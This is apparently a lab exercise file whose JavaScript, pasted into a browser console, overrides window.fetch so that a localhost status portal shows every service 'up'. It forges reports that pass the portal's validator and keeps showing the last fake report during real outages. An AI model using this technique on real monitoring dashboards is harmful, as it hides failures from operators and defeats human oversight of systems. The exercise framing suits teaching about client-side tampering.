// =====================================================================
// MISSION 3 ATTACK: Cover up the outage
// =====================================================================
// Write your attack here, then COPY the whole file and PASTE it into the
// DevTools Console of http://localhost:3000. Then click Refresh.
//
// Start from the worked example in examples/m3_case_fetch_spy.js.
//
// Author:
// =====================================================================

(() => {
  const realFetch = window.fetch;

  // Cache of the last successfully forged "all up" report, used for R4.
  let lastGoodBody = null;

  // Rebuilds ONE raw service entry into a fake "up" entry that will
  // pass the portal's own Mission 1 validator rules.
  function forgeService(rawEntry) {
    if (typeof rawEntry !== "object" || rawEntry === null || Array.isArray(rawEntry)) {
      return null;
    }
    let name = typeof rawEntry.name === "string" ? rawEntry.name.trim() : "";
    if (name.length === 0) name = "Unknown Service";
    if (name.length > 64) name = name.slice(0, 64);
    return { name, status: "up", online: true, latencyMs: 1 };
  }

  // Builds the full forged report from whatever the real server sent back.
  function forgeBody(realParsed) {
    const rawServices = (realParsed && Array.isArray(realParsed.services))
      ? realParsed.services
      : [];
    const services = rawServices.map(forgeService).filter((s) => s !== null);
    const body = { services, rejected: 0, error: null };
    lastGoodBody = body;
    return body;
  }

  // TODO R1: replace window.fetch; requests that are not /api/status must pass through untouched.
  window.fetch = async function (input, init) {
    const url = typeof input === "string" ? input : input.url;

    if (!url.includes("/api/status")) {
      return realFetch(input, init);
    }

    // TODO R2: for /api/status, read the real JSON and forge a report where every service is "up" and online.
    let forged;
    try {
      console.log("before fetch");
      const realResponse = await realFetch(input, init);
      console.log("after fetch");

      // TODO R4: during an outage or a broken proxy, keep showing the last forged "all up" report.
      if (!realResponse.ok) {
        forged = lastGoodBody || { services: [], rejected: 0, error: null };
      } else {
        let parsed;
        try {
          parsed = await realResponse.clone().json();
        } catch (e) {
          forged = lastGoodBody || { services: [], rejected: 0, error: null };
        }
        // TODO R3: the forged report must PASS the portal's validation, so "Rejected entries" shows 0.
        if (!forged) forged = forgeBody(parsed);
      }
    } catch (networkError) {
      forged = lastGoodBody || { services: [], rejected: 0, error: null };
    }

    return new Response(JSON.stringify(forged), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  };

  // TODO R5: expose window.__restoreFetch() that puts the real fetch back.
  window.__restoreFetch = function () {
    window.fetch = realFetch;
    console.log("[coverup] real fetch restored");
  };

  console.log("[attack] cover-up installed");
})();